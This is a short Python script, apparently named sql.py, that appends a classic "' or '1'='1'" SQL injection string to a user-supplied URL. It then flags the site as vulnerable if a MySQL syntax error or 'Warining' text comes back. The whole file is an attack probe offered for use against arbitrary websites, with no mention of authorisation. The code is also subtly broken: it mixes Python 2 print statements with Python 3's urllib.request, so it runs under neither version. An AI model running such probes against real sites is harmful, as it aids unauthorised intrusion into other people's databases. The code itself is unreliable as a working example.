import sys
from urllib import *
import urllib

try:
	url = sys.argv[1]
except:
	print "python sql.py <url>"
	exit()

print "[+] OK."
dork = "=1\' or \'1\' = \'1\'"
error_code = "You have an error in your SQL syntax"
print "Testing...Wait for Finish please..."
res = urllib.request.urlopen(url + dork)
vuc = res.read()
vucud = vuc.decode("utf-8")
if error_code in vucud or "Warining" in vucud:
	print "[+] Vulnerable is Found."
else:
	print "[-] Vulnerable is Not Found."
